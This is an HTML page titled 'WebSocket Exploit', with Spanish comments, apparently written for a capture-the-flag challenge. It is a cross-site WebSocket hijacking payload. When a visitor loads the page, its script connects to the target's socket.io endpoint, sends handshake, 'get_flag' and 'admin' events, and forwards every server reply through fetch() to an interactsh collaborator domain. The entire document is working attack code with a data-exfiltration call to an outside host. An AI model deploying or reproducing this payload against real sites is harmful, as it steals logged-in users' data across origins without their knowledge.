<!DOCTYPE html>
<html>
<head>
    <title>WebSocket Exploit</title>
</head>
<body>
    <script>
        // Reemplaza con tu dominio de interactsh-client
        const COLLABORATOR_URL = 'd2pvfr4gtqkr49rumv50g96k4ju4wr1bd.oast.pro';

        // Conecta al WebSocket del desafío
        const websocket = new WebSocket('ws://k-newswire.task.sasc.tf:8000/socket.io/?EIO=4&transport=websocket');

        websocket.onopen = start;
        websocket.onmessage = handleReply;
        websocket.onclose = function(event) {
            console.log('WebSocket cerrado:', event);
        };
        websocket.onerror = function(error) {
            console.error('Error en WebSocket:', error);
        };

        function start(event) {
            console.log('WebSocket conectado');
            websocket.send('40'); // Handshake inicial
            websocket.send('42["READY"]'); // Evento READY
            // Envía eventos adicionales después de 1 segundo
            setTimeout(() => {
                websocket.send('42["get_flag"]'); // Intenta pedir la flag
                websocket.send('42["admin"]'); // Intenta un evento de admin
                console.log('Eventos adicionales enviados');
            }, 1000);
        }

        function handleReply(event) {
            console.log('Respuesta del servidor:', event.data); // Log para depuración
            // Exfiltra la respuesta a tu servidor
            fetch(`${COLLABORATOR_URL}/?data=${encodeURIComponent(event.data)}`, { mode: 'no-cors' })
                .then(() => console.log('Datos enviados a interactsh'))
                .catch(err => console.error('Error al enviar a interactsh:', err));
        }
    </script>
</body>
</html>
